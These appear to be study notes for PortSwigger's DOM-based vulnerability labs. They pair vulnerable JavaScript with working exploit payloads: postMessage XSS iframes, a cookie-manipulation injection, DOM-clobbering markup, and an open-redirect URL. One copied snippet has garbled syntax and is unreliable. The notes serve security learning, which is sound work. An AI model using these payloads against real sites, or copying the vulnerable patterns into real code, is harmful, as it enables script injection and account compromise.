 **DOM XSS using web messages**


Vulnerable line

```
<script>
    window.addEventListener('message', function(e) {
      eval(e.data);
    });
</script>
```

Event intended to serve ads but we can insert  a script using onload to print

```
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
```

From <https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages> 

**DOM XSS using web messages and a JavaScript URL**
Vulnerable script

```
<script>
  window.addEventListener('message', function(e) {
      var url = e.data;
      if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
          location.href = url;
      }
  }, false);
</script>
```



Exploit

```
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')"></iframe>
```
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/8a21a7f7-d44c-4823-a8d6-e94af7f1b4ff)


**DOM XSS using web messages and JSON.parse**
Vulnerable load-channel 
Load url we can exploit using iframe

```
<script>
  window.addEventListener('message', function(e) {
      var iframe = document.createElement('iframe'), ACMEplayer = {element: iframe}, d;
      document.body.appendChild(iframe);
      try {
          d = JSON.parse(e.data);
      } catch(e) {
          return;
      }
      switch(d.type) {
          case "page-load":
              ACMEplayer.element.scrollIntoView();
              break;
          case "load-channel":
              ACMEplayer.element.src = d.url;
              break;
          case "player-height-changed":
              ACMEplayer.element.style.width = d.width + "px";
              ACMEplayer.element.style.height = d.height + "px";
              break;
      }
  }, false);
```


Exploit 

```
<iframe src=https://0a3d006f04a506c781ee8a2b00ec001b.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
```

**DOM-based open redirection**

Open redirection vulnerability  

  ```
<a href='#' onclick='returnURL' = /url=https?:\/\/.+)/.exec(location); if(returnUrl)location.href = returnUrl[1];else location.href = "/"'>Back to Blog</a>
```



Exploit 
https://YOUR-LAB-ID.web-security-academy.net/post?postId=4&url=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/

From <https://portswigger.net/web-security/dom-based/open-redirection/lab-dom-open-redirection> 

**DOM-based cookie manipulation**
Exploitable code

   ```
<script>
                            document.cookie = 'lastViewedProduct=' + window.location + '; SameSite=None; Secure'
     </script>
```

This script stores the current page by URL in the cookie
Exploit

```
<iframe src="https://0a3b006503c790c3802976a800ab00ef.web-security-academy.net/product?productId=1#'%3E%3Csvg/onload=alert(document.cookie)%3E" onload="this.src='https://0a3b006503c790c3802976a800ab00ef.web-security-academy.net/'">
```

**Exploiting DOM clobbering to enable XSS**
Exploit
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/6e99b420-a9d9-4573-9b47-fdb5713e5a3d)





```
<a id=defaultAvatar><a id=defaultAvatar name=avatar href=”cid:&quot;onclick=alert(1)//”>
```

Our exploit will trigger when we type in a random comment again
**Clobbering DOM attributes to bypass HTML filters**
lab uses the HTMLJanitor library which is vulnerable to DOM clobbering



1. Go to one of the blog posts and create a comment containing the following HTML: 
<form id=x tabindex=0 onfocus=print()><input id=attributes> 
2. Go to the exploit server and add the following iframe to the body: 
<iframe src=https://YOUR-LAB-ID.web-security-academy.net/post?postId=3 onload="setTimeout(()=>this.src=this.src+'#x',500)"> 
Remember to change the URL to contain your lab ID and make sure that the postId parameter matches the postId of the blog post into which you injected the HTML in the previous step. 
3. Store the exploit and deliver it to the victim. The next time the page loads, the print() function is called. 
The library uses the attributes property to filter HTML attributes. However, it is still possible to clobber the attributes property itself, causing the length to be undefined. This allows us to inject any attributes we want into the form element. In this case, we use the onfocus attribute to smuggle the print() function. 
When the iframe is loaded, after a 500ms delay, it adds the #x fragment to the end of the page URL. The delay is necessary to make sure that the comment containing the injection is loaded before the JavaScript is executed. This causes the browser to focus on the element with the ID "x", which is the form we created inside the comment. The onfocus event handler then calls the print() function. 

From <https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-clobbering-attributes-to-bypass-html-filters> 


